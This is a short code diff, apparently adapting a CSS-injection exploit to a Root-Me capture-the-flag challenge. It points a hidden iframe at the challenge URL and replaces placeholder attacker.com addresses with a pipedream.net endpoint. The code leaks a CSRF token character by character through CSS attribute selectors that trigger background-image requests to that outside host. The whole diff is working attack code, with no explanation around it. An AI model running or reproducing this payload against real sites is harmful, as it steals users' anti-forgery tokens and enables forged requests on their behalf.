@@ -34,7 +34,7 @@
 
             // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...
             frame = document.createElement("iframe");
-            frame.src = "https://target.com/vuln_endpoint?vuln_attr=" + css;
+            frame.src = "http://challenge01.root-me.org:58005/?style=" + css;
             frame.style="visibility: hidden;"; //gotta be sneaky sneaky like
             document.getElementById("frames").appendChild(frame);
 
@@ -52,7 +52,7 @@
             setTimeout(function() {
                 var oReq = new XMLHttpRequest();
                 oReq.addEventListener("load", known_listener);
-                oReq.open("GET", "http://attacker.com/currently_known_token");
+                oReq.open("GET", "https://eoorkx698oqzcap.m.pipedream.net/currently_known_token");
                 oReq.send();
             }, 3000);
         }
@@ -62,7 +62,7 @@
             for(var value in values) {
                 css_payload += "input[name=csrf][value^="
                     + values[value]
-                    + "]~*{background-image:url(https://attacker.com/exfil/"
+                    + "]~*{background-image:url(https://eoorkx698oqzcap.m.pipedream.net/exfil/"
                     + values[value]
                     + ")%3B}"; //can't use an actual semicolon because that has a meaning in a url
             }
